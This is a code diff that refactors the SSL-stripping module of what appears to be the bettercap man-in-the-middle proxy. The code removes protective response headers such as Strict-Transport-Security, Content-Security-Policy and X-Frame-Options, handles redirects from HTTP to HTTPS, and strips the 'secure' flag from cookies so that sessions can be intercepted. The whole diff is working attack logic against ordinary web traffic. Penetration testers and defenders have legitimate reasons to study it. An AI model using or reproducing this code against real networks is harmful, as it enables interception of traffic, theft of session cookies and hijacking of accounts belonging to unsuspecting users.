@@ -162,22 +162,30 @@ class Strip
 
   private
 
+  # Headers to patch both in requests and responses.
+  HEADERS_TO_PATCH = {
+    :req => {
+      'Accept-Encoding'           => nil,
+      'If-None-Match'             => nil,
+      'If-Modified-Since'         => nil,
+      'Upgrade-Insecure-Requests' => nil,
+      'Pragma'                    => 'no-cache'
+    },
+
+    :res => {
+      'X-Frame-Options'           => nil,
+      'X-Content-Type-Options'    => nil,
+      'X-Xss-Protection'          => nil,
+      'Strict-Transport-Security' => nil,
+      'Content-Security-Policy'   => nil
+    }
+  }.freeze
+
   # Clean some headers from +r+.
   def process_headers!(r)
-    # clean request
-    if r.is_a?(BetterCap::Proxy::Request)
-      r['Accept-Encoding']           = nil
-      r['If-None-Match']             = nil
-      r['If-Modified-Since']         = nil
-      r['Upgrade-Insecure-Requests'] = nil
-      r['Pragma']                    = 'no-cache'
-    # clean response
-    else
-      r['X-Frame-Options']           = nil
-      r['X-Content-Type-Options']    = nil
-      r['X-Xss-Protection']          = nil
-      r['Strict-Transport-Security'] = nil
-      r['Content-Security-Policy']   = nil
+    what = r.is_a?(BetterCap::Proxy::Request) ? :req : :res
+    HEADERS_TO_PATCH[what].each do |key,value|
+      r[key] = value;
     end
   end
 
@@ -247,7 +255,6 @@ class Strip
       # no cookies set, just a normal http -> https redirect
       if response['Set-Cookie'].empty?
         Logger.info "[#{'SSLSTRIP'.green} #{request.client}] Found redirect to HTTPS '#{original}' -> '#{stripped}'."
-
         # The request will be retried on port 443 if MAX_REDIRECTS is not reached.
         request.port = 443
         # retry the request if possible
@@ -257,18 +264,9 @@ class Strip
         Logger.info "[#{'SSLSTRIP'.green} #{request.client}] Found redirect to HTTPS ( with cookies ) '#{original}' -> '#{stripped}'."
         # we know this session, do not kill it!
         @cookies.add!( request )
-        # remove the 'secure' descriptor from every cookie
-        cookies = response['Set-Cookie']
-        cookies = cookies.is_a?(Array)? cookies : ( cookies.empty?? [] : [cookies] )
-
-        unless cookies.empty?
-          clean = []
-          cookies.each do |cookie|
-            clean << cookie.gsub( /secure/, '' )
-          end
-          response['Set-Cookie'] = clean
-        end
-
+        # remove the 'secure' flag from every cookie.
+        # ref: https://www.owasp.org/index.php/SecureFlag
+        response.patch_header!( 'Set-Cookie', /secure/, '' )
         # do not retry request
         return false
       end
@@ -309,9 +307,10 @@ class Strip
   def add_stripped_object( o )
     begin
       stripped_hostname = o.stripped_hostname
+      original_address  = IPSocket.getaddress( o.original_hostname )
       @stripped << o
       # make sure we're able to resolve the stripped domain
-      @resolver.add_rule( stripped_hostname, IPSocket.getaddress( o.original_hostname ) )
+      @resolver.add_rule( stripped_hostname, original_address )
     rescue Exception => e
       Logger.exception(e)
     end
